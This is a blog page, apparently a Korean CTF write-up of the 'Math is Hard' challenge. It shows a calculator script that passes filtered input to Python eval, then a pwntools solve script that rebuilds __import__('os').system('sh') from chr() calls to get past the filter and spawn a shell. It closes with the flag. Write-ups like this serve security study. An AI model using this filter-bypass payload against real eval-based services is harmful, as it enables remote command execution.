@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;2002   ?   [? solves &#x2F; ? points]  바로 지난 주말에 치뤄진 대회인데 challenge가 모두 내려가서 문제 정보를 알 수가 없다 ㅜㅜ Analysis문제는 python 스크립트 하나만 주어진다. calc.pypython 스크립트만 주어지는 문제는 항상 긴장된다. 123456">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TBCL CTF 2023 - Math is Hard (python, eval)">
+<meta property="og:url" content="https://jiravvit.github.io/230524-tbclctf2023-math_is_hard/index.html">
+<meta property="og:site_name" content="jir4vvit">
+<meta property="og:description" content="https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;2002   ?   [? solves &#x2F; ? points]  바로 지난 주말에 치뤄진 대회인데 challenge가 모두 내려가서 문제 정보를 알 수가 없다 ㅜㅜ Analysis문제는 python 스크립트 하나만 주어진다. calc.pypython 스크립트만 주어지는 문제는 항상 긴장된다. 123456">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-05-23T22:00:00.000Z">
+<meta property="article:modified_time" content="2023-05-23T17:21:17.935Z">
+<meta property="article:author" content="jir4vvit">
+<meta property="article:tag" content="python">
+<meta property="article:tag" content="eval">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/judi2.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/judi2.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/judi2.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>TBCL CTF 2023 - Math is Hard (python, eval)</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/230524-deadsecctf2023-one_punch/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/230523-byuctf2023-0review/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/230524-tbclctf2023-math_is_hard/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/230524-tbclctf2023-math_is_hard/&text=TBCL CTF 2023 - Math is Hard (python, eval)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/230524-tbclctf2023-math_is_hard/&title=TBCL CTF 2023 - Math is Hard (python, eval)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/230524-tbclctf2023-math_is_hard/&is_video=false&description=TBCL CTF 2023 - Math is Hard (python, eval)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=TBCL CTF 2023 - Math is Hard (python, eval)&body=Check out this article: https://jiravvit.github.io/230524-tbclctf2023-math_is_hard/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/230524-tbclctf2023-math_is_hard/&title=TBCL CTF 2023 - Math is Hard (python, eval)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/230524-tbclctf2023-math_is_hard/&title=TBCL CTF 2023 - Math is Hard (python, eval)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/230524-tbclctf2023-math_is_hard/&title=TBCL CTF 2023 - Math is Hard (python, eval)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/230524-tbclctf2023-math_is_hard/&title=TBCL CTF 2023 - Math is Hard (python, eval)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/230524-tbclctf2023-math_is_hard/&name=TBCL CTF 2023 - Math is Hard (python, eval)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/230524-tbclctf2023-math_is_hard/&t=TBCL CTF 2023 - Math is Hard (python, eval)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solve"><span class="toc-number">2.</span> <span class="toc-text">Solve</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag"><span class="toc-number">2.1.</span> <span class="toc-text">Flag</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        TBCL CTF 2023 - Math is Hard (python, eval)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">jir4vvit</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-05-23T22:00:00.000Z" itemprop="datePublished">2023-05-24</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/WriteUp/">WriteUp</a> › <a class="category-link" href="/categories/WriteUp/TBCL/">TBCL</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/eval/" rel="tag">eval</a>, <a class="tag-link-link" href="/tags/python/" rel="tag">python</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <ul>
+<li><a target="_blank" rel="noopener" href="https://ctftime.org/event/2002">https://ctftime.org/event/2002</a></li>
+</ul>
+<blockquote>
+<p>?</p>
+</blockquote>
+<ul>
+<li>[? solves &#x2F; ? points]</li>
+</ul>
+<p>바로 지난 주말에 치뤄진 대회인데 challenge가 모두 내려가서 문제 정보를 알 수가 없다 ㅜㅜ</p>
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>문제는 python 스크립트 하나만 주어진다. calc.py<br>python 스크립트만 주어지는 문제는 항상 긴장된다.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">USAGE = <span class="string">&quot;&quot;&quot;PwnCalc -- a simple calculator</span></span><br><span class="line"><span class="string">$ a=4</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>a = 4</span></span><br><span class="line"><span class="string">$ a = 4</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>a = 4</span></span><br><span class="line"><span class="string">$ b = 3</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>b = 3</span></span><br><span class="line"><span class="string">$ c = sqrt(a*a+b*b)</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>c = 5.0</span></span><br><span class="line"><span class="string">$ d = sin(pi/4)</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>d = 0.7071067811865475</span></span><br><span class="line"><span class="string">Have fun!</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_expression</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Allow only digits, decimal point, lowecase letters and math symbols.&quot;&quot;&quot;</span></span><br><span class="line">    SYMBOLS = <span class="string">&quot;.+*-/()&quot;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> c.islower() <span class="keyword">and</span> <span class="keyword">not</span> c.isdigit() <span class="keyword">and</span> c <span class="keyword">not</span> <span class="keyword">in</span> SYMBOLS:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">loop</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Main calculator loop.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">vars</span> = &#123; c : <span class="number">0</span> <span class="keyword">for</span> c <span class="keyword">in</span> ascii_lowercase &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        line = <span class="built_in">input</span>(<span class="string">&quot;$ &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Bye!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        items = line.split(<span class="string">&quot;=&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(items) != <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Invalid syntax!&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        varname, expression = items</span><br><span class="line">        varname = varname.strip()</span><br><span class="line">        expression = expression.strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(varname) != <span class="number">1</span> <span class="keyword">or</span> <span class="keyword">not</span> varname.islower():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Invalid variable name!&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_expression(expression):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Invalid character in expression!&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        result = <span class="built_in">eval</span>(expression, <span class="built_in">vars</span>, &#123;<span class="string">&#x27;sin&#x27;</span>: sin, <span class="string">&#x27;cos&#x27;</span>: cos, <span class="string">&#x27;sqrt&#x27;</span>: sqrt, <span class="string">&#x27;exp&#x27;</span>: exp, <span class="string">&#x27;log&#x27;</span>: log, <span class="string">&#x27;pi&#x27;</span>: pi&#125;)</span><br><span class="line">        <span class="built_in">vars</span>[varname] = result</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &#123;&#125; = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(varname, result))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(USAGE)</span><br><span class="line">    loop()</span><br></pre></td></tr></table></figure>
+
+<p><code>result = eval(expression, vars, &#123;&#39;sin&#39;: sin, &#39;cos&#39;: cos, &#39;sqrt&#39;: sqrt, &#39;exp&#39;: exp, &#39;log&#39;: log, &#39;pi&#39;: pi&#125;)</code> 에서 <code>eval</code> 함수를 사용해서 취약점이 발생할 수 있다.</p>
+<p><code>__import__(&#39;os&#39;).system(&#39;sh&#39;)</code> 을 실행시키고 싶다. 이를 위해 <code>eval(__import__(&#39;os&#39;).system(&#39;sh&#39;))</code>을 서버에서 실행시키고 싶었다. 이때 문제는 <code>.+*-/()</code>만 허용해서 <code>&#39;</code>을 사용할 수가 없다. 이를 위해 <code>eval</code>과 <code>chr</code>을 사용했고 이걸 로컬이 아닌 서버에서 실행시키도록 노력했다. payload를 로컬에서 실행시킬 때 에러 없이 원하는 행위를 실행시킬 수 있어야 한다. 이게 그대로 서버에서 실행된다고 생각하면 된다.</p>
+<p><code>python eval</code> 취약점에 대한 자세한 내용은 아래 블로그를 참고했다.</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://passwd.tistory.com/entry/eval-%EB%AC%B8%EC%9E%90%EC%97%B4-%EC%8B%9D-%EC%8B%A4%ED%96%89">https://passwd.tistory.com/entry/eval-%EB%AC%B8%EC%9E%90%EC%97%B4-%EC%8B%9D-%EC%8B%A4%ED%96%89</a></li>
+</ul>
+<h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&#x27;python&#x27;, &#x27;./calc.py&#x27;])</span></span><br><span class="line">p = remote(<span class="string">&#x27;0.cloud.chals.io&#x27;</span>, <span class="number">19815</span>)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;__import__(\&#x27;os\&#x27;).system(\&#x27;sh\&#x27;)&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a = &#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;eval(&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">    payload += <span class="string">&#x27;chr(&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">ord</span>(c)) + <span class="string">&#x27;)+&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = payload[:-<span class="number">1</span>]</span><br><span class="line">payload += <span class="string">&#x27;)&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;$&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TBTL&#123;4Nd_54nd80x1n6_15_3v3n_h4rd3r&#125;</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solve"><span class="toc-number">2.</span> <span class="toc-text">Solve</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag"><span class="toc-number">2.1.</span> <span class="toc-text">Flag</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/230524-tbclctf2023-math_is_hard/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/230524-tbclctf2023-math_is_hard/&text=TBCL CTF 2023 - Math is Hard (python, eval)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/230524-tbclctf2023-math_is_hard/&title=TBCL CTF 2023 - Math is Hard (python, eval)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/230524-tbclctf2023-math_is_hard/&is_video=false&description=TBCL CTF 2023 - Math is Hard (python, eval)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=TBCL CTF 2023 - Math is Hard (python, eval)&body=Check out this article: https://jiravvit.github.io/230524-tbclctf2023-math_is_hard/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/230524-tbclctf2023-math_is_hard/&title=TBCL CTF 2023 - Math is Hard (python, eval)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/230524-tbclctf2023-math_is_hard/&title=TBCL CTF 2023 - Math is Hard (python, eval)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/230524-tbclctf2023-math_is_hard/&title=TBCL CTF 2023 - Math is Hard (python, eval)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/230524-tbclctf2023-math_is_hard/&title=TBCL CTF 2023 - Math is Hard (python, eval)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/230524-tbclctf2023-math_is_hard/&name=TBCL CTF 2023 - Math is Hard (python, eval)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/230524-tbclctf2023-math_is_hard/&t=TBCL CTF 2023 - Math is Hard (python, eval)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2023
+    jir4vvit
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'jiravvit-github-io';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
